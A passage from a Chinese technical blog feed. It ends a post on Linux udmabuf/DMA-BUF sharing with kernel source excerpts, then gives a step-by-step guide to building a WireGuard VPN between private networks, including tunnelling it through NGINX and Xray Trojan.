PROT_READ|PROT_WRITE, MAP_FILE | MAP_SHARED, dma_fd, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span> (!buf2) &#123;<br>            perror(<span class="hljs-string">&quot;Failed to map dma_fd&quot;</span>);<br>            <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>        &#125;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; i++) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Get data: %s\n&quot;</span>, &amp;buf2[<span class="hljs-number">0x1000</span> * i]);<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        wait(<span class="hljs-literal">NULL</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>测试，成功完成数据传递：</p><p><img src="https://s2.loli.net/2024/12/31/JOojDcGvU4XK1T5.png"></p><h2 id="内部实现（🕊）"><a href="#内部实现（🕊）" class="headerlink" title="内部实现（🕊）"></a>内部实现（🕊）</h2><p>udmabuf 的实现非常简单，主要就是注册了一个杂项设备 <code>/dev/udmabuf</code> ，并支持两个自定义的 IOCTL 命令：</p><blockquote><p>&#x2F;drivers&#x2F;dma-buf&#x2F;udmabuf.c</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">udmabuf_ioctl</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *filp, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> ioctl,</span><br><span class="hljs-params">  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg)</span><br>&#123;<br><span class="hljs-type">long</span> ret;<br><br><span class="hljs-keyword">switch</span> (ioctl) &#123;<br><span class="hljs-keyword">case</span> UDMABUF_CREATE:<br>ret = udmabuf_ioctl_create(filp, arg);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> UDMABUF_CREATE_LIST:<br>ret = udmabuf_ioctl_create_list(filp, arg);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">default</span>:<br>ret = -ENOTTY;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file_operations</span> <span class="hljs-title">udmabuf_fops</span> =</span> &#123;<br>.owner= THIS_MODULE,<br>.unlocked_ioctl = udmabuf_ioctl,<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_COMPAT</span><br>.compat_ioctl   = udmabuf_ioctl,<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">miscdevice</span> <span class="hljs-title">udmabuf_misc</span> =</span> &#123;<br>.minor          = MISC_DYNAMIC_MINOR,<br>.name           = <span class="hljs-string">&quot;udmabuf&quot;</span>,<br>.fops           = &amp;udmabuf_fops,<br>&#125;;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;世界第一 DMA-BUF 大师是对的！&lt;/p&gt;</summary>
    
    
    
    <category term="OS" scheme="https://arttnba3.github.io/categories/OS/"/>
    
    
    <category term="Linux" scheme="https://arttnba3.github.io/tags/Linux/"/>
    
    <category term="Linux Kernel" scheme="https://arttnba3.github.io/tags/Linux-Kernel/"/>
    
    <category term="操作系统" scheme="https://arttnba3.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="DMA-BUF" scheme="https://arttnba3.github.io/tags/DMA-BUF/"/>
    
  </entry>
  
  <entry>
    <title>【OPS.0x04】使用 Wireguard 进行异地组网</title>
    <link href="https://arttnba3.github.io/2024/10/23/OPS-0X04-WIREGUARD_VPN/"/>
    <id>https://arttnba3.github.io/2024/10/23/OPS-0X04-WIREGUARD_VPN/</id>
    <published>2024-10-22T13:26:19.000Z</published>
    <updated>2024-11-11T10:41:29.792Z</updated>
    
    <content type="html"><![CDATA[<p>龙哥就是龙！惹啊！</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00. 一切开始之前"></a>0x00. 一切开始之前</h1><p>最近手上的各种服务器不知道为啥多了起来，但大都没有公网 IP，又都处在不同的局域网里，笔者的肉身连带自己的笔记本也没有办法同时处在这些不同的网络当中，因此笔者迫切需要一个可用且优雅的异地组网方案，从而让笔者能够无论身处何处都能随时访问不同局域网中的任意一台服务器， <del>当然现在看来这些服务器大部分情况下的用途似乎就是让笔者闲暇时刻运行 neofetch 和 btop 玩玩</del></p><p>局域网（Local Area Network）也就是我们常说的内网，此类网络通常共用一个连接到互联网（公网）的路由器，共用同一公网 IP，利用网络地址转换（Network Address Translation）技术为内网中的设备与公网服务器建立连接（简而言之就是公网 <code>IP:端口</code> 到内网 <code>IP:端口</code> 整了个映射），因此要与内网中的设备进行通信，我们实质上要实现 <strong>内网穿透</strong> ，也叫 <strong>NAT 穿透</strong> （NAT traversal）</p><p><img src="https://s2.loli.net/2024/10/10/MjaG5i82cKsqoXz.png"></p><p>这个需求的实现其实很简单，我们只需要把不同 LAN 当中的设备组到同一个虚拟网络当中就行—— <code>Virtual Private Network</code> 就是专业干这个的，我们可以使用 VPN 技术在设备间建立点对点的加密信道，从而将不同局域网当中的服务器连接起来，而若要为都处于内网的机器进行打洞，则通常需要有一台位于公网的服务器为他们进行中继：</p><p><img src="https://s2.loli.net/2024/10/21/I62pACK4hQedEnB.png"></p><p>现有的比较成熟的无需用户自行在公网架设服务器的异地组网服务有 tailscale、zerotier 等，但由于其在中国大陆内通常没有相应的中继服务器，从而导致在国内想要通过此类服务进行连接则往往带有一定的延迟（反正笔者是忍受不了）</p><p><img src="https://s2.loli.net/2024/10/21/gfMBh2R81baV5SG.png"></p><p>如何解决这个问题？不难想到我们可以在公网 VPS 上自行搭建 tailscale 的 DERP 节点，或是自建 zerotier 的 Moon 节点，但既然都要自建节点了， <em>那么我们为什么不直接自建 VPN 呢</em> —— 诸如 IPSec、OpenVPN 等老牌 VPN 方案可谓是应有尽有</p><p>但相比于这些传统方案，笔者更愿意选择被 Linus 青睐甚至已经合并入 Linux kernel mainline 的 <strong>WireGuard</strong> —— 这是一个高性能的基于 UDP 的现代 VPN 协议，或许也是目前已知的最好的 VPN 解决方案</p><p><img src="https://s2.loli.net/2024/10/22/8M5FgnkYtdzCqVU.png"></p><p>本篇博客主要讲述如何利用公网服务器搭建 WireGuard VPN 网络</p><h1 id="0x01-公网服务器基本配置"><a href="#0x01-公网服务器基本配置" class="headerlink" title="0x01. 公网服务器基本配置"></a>0x01. 公网服务器基本配置</h1><h2 id="安装与配置-WireGuard"><a href="#安装与配置-WireGuard" class="headerlink" title="安装与配置 WireGuard"></a>安装与配置 WireGuard</h2><p>首先我们在公网服务器上安装 WireGuard，笔者这里是 <code>Ubuntu 24.04</code>：</p><blockquote><p>参考： <a href="https://www.wireguard.com/install/">WireGuard - Installation</a></p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get update</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get upgrade</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get install wireguard</span><br></code></pre></td></tr></table></figure><p>完成安装之后我们会获得一个内核模块，以及相应的用户态 CLI 程序 <code>wg</code> ：</p><p><img src="https://s2.loli.net/2024/10/21/Aiw9cQTp4k537B6.png"></p><p>接下来使用 <code>wg</code> 生成一份私钥与对应的公钥，存放在 <code>/etc/wireguard</code> 目录下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">wg genkey | sudo <span class="hljs-built_in">tee</span> /etc/wireguard/privatekey | wg pubkey | sudo <span class="hljs-built_in">tee</span> /etc/wireguard/publickey</span><br></code></pre></td></tr></table></figure><p>接下来创建 WireGuard 配置文件，这里我们放在 <code>/etc/wireguard/wg0.conf</code> ，写入如下内容：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[Interface]</span><br><span class="hljs-attr">PrivateKey</span> = 私钥文件内容<br><span class="hljs-attr">ListenPort</span> = 自定义的监听端口<br><span class="hljs-attr">Address</span> = 自定义的内网地址，例如 <span class="hljs-number">10.0</span>.<span class="hljs-number">0.1</span>/<span class="hljs-number">24</span><br><span class="hljs-attr">PostUp</span>   = iptables -A FORWARD -i wg0 -j ACCEPT<span class="hljs-comment">; iptables -A FORWARD -o wg0 -j ACCEPT; iptables -t nat -A POSTROUTING -o 你的能访问公网的网卡名 -j MASQUERADE</span><br><span class="hljs-attr">PostDown</span> = iptables -D FORWARD -i wg0 -j ACCEPT<span class="hljs-comment">; iptables -D FORWARD -o wg0 -j ACCEPT; iptables -t nat -D POSTROUTING -o 你的能访问公网的网卡名 -j MASQUERADE</span><br></code></pre></td></tr></table></figure><p>这里的 <code>PostUp</code> 与 <code>PostDown</code> 参数分别为接口启动时与关闭时执行的命令，其中 <code>wg0</code> 为我们后面要创建的虚拟网卡名，该命令主要用于流量转发，这里不再赘叙</p><p>对于可以访问公网的网卡的名称，可以简单通过如下命令进行获取：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">ip -o -4 route show to default | awk <span class="hljs-string">&#x27;&#123;print $5&#125;&#x27;</span></span><br></code></pre></td></tr></table></figure><p>接下来使用如下命令启动该接口，其会创建一个虚拟网卡 <code>wg0</code> ：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo wg-quick up wg0</span><br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/10/21/nvVi1fWaR3ZLDEd.png"></p><p>最后，我们可以为 <code>wg0</code> 接口配置自启动：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo systemctl <span class="hljs-built_in">enable</span> wg-quick@wg0</span><br></code></pre></td></tr></table></figure><h2 id="配置防火墙"><a href="#配置防火墙" class="headerlink" title="配置防火墙"></a>配置防火墙</h2><p>为了让 iptables 规则正常工作，我们还需要修改防火墙以允许 IPV4 流量转发，首先编辑 <code>/etc/sysctl.conf</code> 文件，添加如下配置：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">net.ipv4.ip_forward</span> = <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><blockquote><p>也可以在 WireGuard 配置文件中的 <code>[Interface]</code> 添加如下配置：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">PostUp</span> = sysctl -w net.ipv4.ip_forward=<span class="hljs-number">1</span><br><span class="hljs-attr">PostDown</span> = sysctl -w net.ipv4.ip_forward=<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure></blockquote><p>然后重新载入配置：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo sysctl -p</span><br></code></pre></td></tr></table></figure><p>最后开启 wireguard 监听端口上的 UDP 连接：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo ufw allow 你的自定义端口/udp</span><br></code></pre></td></tr></table></figure><blockquote><p>如果你使用阿里云这样比较专业的云服务器提供商，你可能还需要在相应的控制台页面添加规则：</p><p><img src="https://s2.loli.net/2024/10/21/XmPRkVf6yJzWKCj.png"></p></blockquote><h1 id="0x02-客户端基本配置"><a href="#0x02-客户端基本配置" class="headerlink" title="0x02. 客户端基本配置"></a>0x02. 客户端基本配置</h1><h2 id="Linux-客户端配置"><a href="#Linux-客户端配置" class="headerlink" title="Linux 客户端配置"></a>Linux 客户端配置</h2><h3 id="基础配置"><a href="#基础配置" class="headerlink" title="基础配置"></a>基础配置</h3><p>首先还是按惯例在本地安装 WireGuard，这里笔者的系统是 <code>openSUSE Tumbleweed</code> ：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo zypper <span class="hljs-keyword">in</span> wireguard-tools</span><br></code></pre></td></tr></table></figure><p>然后按惯例生成公钥与私钥：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">wg genkey | sudo <span class="hljs-built_in">tee</span> /etc/wireguard/privatekey | wg pubkey | sudo <span class="hljs-built_in">tee</span> /etc/wireguard/publickey</span><br></code></pre></td></tr></table></figure><p>接下来修改服务端配置文件， <strong>添加</strong> 客户端配置如下：</p><blockquote><p>每新增一个客户端就添加一份 <code>[Peer]</code> 配置</p></blockquote><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[Peer]</span><br><span class="hljs-attr">PublicKey</span> = 客户端生成的公钥<br><span class="hljs-attr">AllowedIPs</span> = 自定义的内网地址，例如 <span class="hljs-number">10.0</span>.<span class="hljs-number">0.2</span>/<span class="hljs-number">32</span><br></code></pre></td></tr></table></figure><p>重启服务端 WireGuard：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo wg-quick down wg0 &amp;&amp; sudo wg-quick up wg0</span><br></code></pre></td></tr></table></figure><p>然后创建配置文件 <code>/etc/wireguard/wg0.conf</code> ，写入如下内容：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[Interface]</span><br><span class="hljs-attr">PrivateKey</span> = 客户端生成的私钥<br><span class="hljs-attr">Address</span> = 上面配置的客户端地址<br><span class="hljs-attr">MTU</span> = <span class="hljs-number">1280</span><br><br><span class="hljs-section">[Peer]</span><br><span class="hljs-attr">PublicKey</span> = 服务端的公钥<br><span class="hljs-attr">Endpoint</span> = 服务端的公网地址或是域名:服务端的端口<br><span class="hljs-attr">AllowedIPs</span> = 服务端网段，例如 <span class="hljs-number">10.0</span>.<span class="hljs-number">0.0</span>/<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure><blockquote><p>如果你不止想要组网，还想要让 WireGuard 服务端代理客户端的全部流量，只需要配置客户端的 <code>AllowedIPs = 0.0.0.0/0</code> 即可</p></blockquote><p>最后按惯例启动 WireGuard 即可：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo wg-quick up wg0</span><br></code></pre></td></tr></table></figure><p>如果有需要，可以配置自启动：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo systemctl <span class="hljs-built_in">enable</span> wg-quick@wg0</span><br></code></pre></td></tr></table></figure><h3 id="配置-DDNS"><a href="#配置-DDNS" class="headerlink" title="配置 DDNS"></a>配置 DDNS</h3><p>作为中继的公网服务器的 IP 在某些需求下不一定是恒定的，虽然说域名通常是可以不变的，但有的时候域名对应的 IP 可能会发生改变，而 WireGuard 不会重复进行解析，仅会使用第一次的结果，从而可能造成组网失败 ：（</p><p>对于 Linux，WireGuard 官方已经提供了 <a href="https://github.com/WireGuard/wireguard-tools/tree/master/contrib/reresolve-dns">一份自动重新解析 DNS 的脚本</a> ，我们只需要设置一个定时执行任务即可，例如使用 <code>crontab</code> ：</p><blockquote><p>在 Ubuntu 下，该脚本似乎会默认在 <code>/usr/share/doc/wireguard-tools/examples/reresolve-dns/reresolve-dns.sh</code> 安装一份</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cron">1 * * * * 脚本所在目录/reresolve-dns.sh wg0 # 每小时执行一次<br></code></pre></td></tr></table></figure><h2 id="Windows-客户端配置"><a href="#Windows-客户端配置" class="headerlink" title="Windows 客户端配置"></a>Windows 客户端配置</h2><blockquote><p>不用 Windows 👋</p></blockquote><p>首先从<a href="https://download.wireguard.com/windows-client/">官网</a>下载对应架构的安装包并安装，选择新建空隧道：</p><p><img src="https://s2.loli.net/2024/10/22/mlQ3A6qL8pH7uW1.png"></p><p>其会自动生成一份私钥和公钥，我们只需要再按照前面的方式填写配置文件即可：</p><p><img src="https://s2.loli.net/2024/10/22/osNnbW2zGuFT9I7.png"></p><p>之后在服务端也添加相应配置并重启 WireGuard 即可</p><h1 id="0x03-利用-NGINX-反代-WireGuard-Over-Trojan"><a href="#0x03-利用-NGINX-反代-WireGuard-Over-Trojan" class="headerlink" title="0x03. 利用 NGINX 反代 WireGuard Over Trojan"></a>0x03. 利用 NGINX 反代 WireGuard Over Trojan</h1><blockquote><p>注：这会让速度大幅下降➕延迟大幅提高（毕竟多了好几层传输和加解密的工作），因此除非 Wireguard 直连无法完成配置，否则笔者 <em>其实不太推荐搭建这样的架构</em> </p></blockquote><p>众所周知随着国际网络局势不断变化，前面忘了中间忘了后面也忘了，总而言之就是跨国或是跨地区的 WireGuard 直接组网因为各种直接或间接的因素而存在一定的小问题导致无法连接成功，因此需要为我们的 WireGuard 隧道套一些防护</p><p>基于 UDP 的 WireGuard 协议容易被各种预期外的物理因素识别与阻断，因此我们不难想到的是我们可以再套几层协议以提高其连接稳定性，在 <a href="https://arttnba3.cn/2024/08/31/OPS-0X02-AUSTRALIA_FIREWALL_ESCAPE/">如何在澳洲校园网玩原神</a> 这一篇博客中笔者简要叙述了使用 NGINX + Websocket + TLS + Trojan 的代理方案，在这里我们同样可以利用类似的架构转发 Wireguard 流量完成组网</p><p><img src="https://s2.loli.net/2024/11/08/Ym5e8gaBD6RduEy.png" alt="随手画了个图，可能有点难看，不过大概是这个意思"></p><blockquote><p>注：似乎 WireGuard 在这个架构当中是多余的，也可以直接用 Xray 组网？</p></blockquote><h2 id="公网服务器配置"><a href="#公网服务器配置" class="headerlink" title="公网服务器配置"></a>公网服务器配置</h2><blockquote><p>注：可以通过 CloudFlare CDN 代理隐藏公网服务器真实 IP，但需要注意的是在部分网络线路下 CloudFlare 的部分网段是被屏蔽的，从而导致可用性下降</p></blockquote><h3 id="1️⃣-配置-WireGuard"><a href="#1️⃣-配置-WireGuard" class="headerlink" title="1️⃣ 配置 WireGuard"></a>1️⃣ 配置 WireGuard</h3><p>和前面的流程基本一样，这里不再赘叙</p><h3 id="2️⃣-配置-NGINX-反向代理"><a href="#2️⃣-配置-NGINX-反向代理" class="headerlink" title="2️⃣ 配置 NGINX 反向代理"></a>2️⃣ 配置 NGINX 反向代理</h3><p>首先是安装与启用 NGINX：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get install -y nginx</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo systemctl <span class="hljs-built_in">enable</span> --now nginx.service</span><br></code></pre></td></tr></table></figure><p>接下来在 <code>/etc/nginx/conf.d</code> 目录下创建一个新的配置文件 <code>自己想名字.conf</code> ，写入如下内容：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">server</span> &#123;<br>        <span class="hljs-attribute">listen</span> <span class="hljs-number">443</span> ssl;<br>        <span class="hljs-attribute">listen</span> [::]:<span class="hljs-number">443</span> ssl;<br>        <span class="hljs-attribute">server_name</span> 你的域名;<br><br>        <span class="hljs-attribute">ssl_protocols</span>   TLSv1.<span class="hljs-number">2</span> TLSv1.<span class="hljs-number">3</span>;<br>        <span class="hljs-attribute">ssl_certificate</span>     你的 .pem 证书路径;<br>        <span class="hljs-attribute">ssl_certificate_key</span> 你的 .key 密钥路径;<br>        <span class="hljs-attribute">ssl_session_cache</span>       shared:SSL:<span class="hljs-number">10m</span>;<br>        <span class="hljs-attribute">ssl_session_timeout</span>     <span class="hljs-number">10m</span>;<br><br>        <span class="hljs-section">location</span> / &#123;<br>                <span class="hljs-attribute">root</span> /srv/www/你的自定义网页路径;<br>                <span class="hljs-attribute">index</span> index.html;<br>        &#125;<br><br>        <span class="hljs-section">location</span> /和xray配置相同的你的自定义路径 &#123;<br>                <span class="hljs-attribute">if</span> (<span class="hljs-variable">$http_upgrade</span> != <span class="hljs-string">&quot;websocket&quot;</span>) &#123;<br>                        <span class="hljs-attribute">return</span> <span class="hljs-number">400</span>;<br>                &#125;<br>                <span class="hljs-attribute">proxy_pass</span> http://127.0.0.1:和xray配置相同的你的自定义本地监听端口，例如11451;<br>                <span class="hljs-attribute">proxy_intercept_errors</span> <span class="hljs-literal">on</span>;<br>                <span class="hljs-attribute">error_page</span> <span class="hljs-number">400</span> = https://你自己的域名/;<br><br>                <span class="hljs-attribute">proxy_http_version</span> <span class="hljs-number">1</span>.<span class="hljs-number">1</span>;<br>                <span class="hljs-attribute">proxy_set_header</span> Upgrade <span class="hljs-variable">$http_upgrade</span>;<br>                <span class="hljs-attribute">proxy_set_header</span> Connection <span class="hljs-string">&quot;upgrade&quot;</span>;<br>                <span class="hljs-attribute">proxy_read_timeout</span> <span class="hljs-number">600s</span>;<br><br>                <span class="hljs-attribute">proxy_set_header</span> X-Read-IP <span class="hljs-variable">$remote_addr</span>;<br>                <span class="hljs-attribute">proxy_set_header</span> X-Forwarded-For <span class="hljs-variable">$proxy_add_x_forwarded_for</span>;<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>最后重启 NGINX：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo systemctl restart nginx.service</span><br></code></pre></td></tr></table></figure><h3 id="3️⃣-配置-XRAY-Trojan-代理"><a href="#3️⃣-配置-XRAY-Trojan-代理" class="headerlink" title="3️⃣ 配置 XRAY Trojan 代理"></a>3️⃣ 配置 XRAY Trojan 代理</h3><p>直接上 Docker：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> debian:latest<br><br><span class="hljs-keyword">ARG</span> DEBIAN_FRONTEND=noninteractive<br><br><span class="hljs-keyword">RUN</span><span class="language-bash"> apt-get update &amp;&amp; apt-get upgrade</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> apt-get install -y curl wget unzip procps</span><br><br><span class="hljs-keyword">RUN</span><span class="language-bash"> wget -P /root/ https://github.com/XTLS/Xray-core/releases/download/v24.11.5/Xray-linux-64.zip</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> unzip /root/Xray-linux-64.zip -d /root/</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">chmod</span> +x /root/xray</span><br><span class="hljs-keyword">COPY</span><span class="language-bash"> ./config.json /root/config.json</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;#!/bin/sh\n/root/xray run -config /root/config.json\nsleep infinity&quot;</span> &gt; /start.sh</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">chmod</span> +x /start.sh</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">mkdir</span> -p /var/log/xray</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">ln</span> -sf ../usr/share/zoneinfo/Australia/Melbourne /etc/localtime</span><br><br><span class="hljs-keyword">EXPOSE</span> <span class="hljs-number">11451</span><br><span class="hljs-keyword">CMD</span><span class="language-bash"> [<span class="hljs-string">&quot;/start.sh&quot;</span>]</span><br></code></pre></td></tr></table></figure><p>配置文件 <code>config.json</code> 这么写：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;log&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;loglevel&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;warning&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;error&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;你的日志地址，例如/var/log/xray/error.log&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;access&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;你的日志地址，例如/var/log/xray/access.log&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;inbounds&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;listen&quot;</span><span 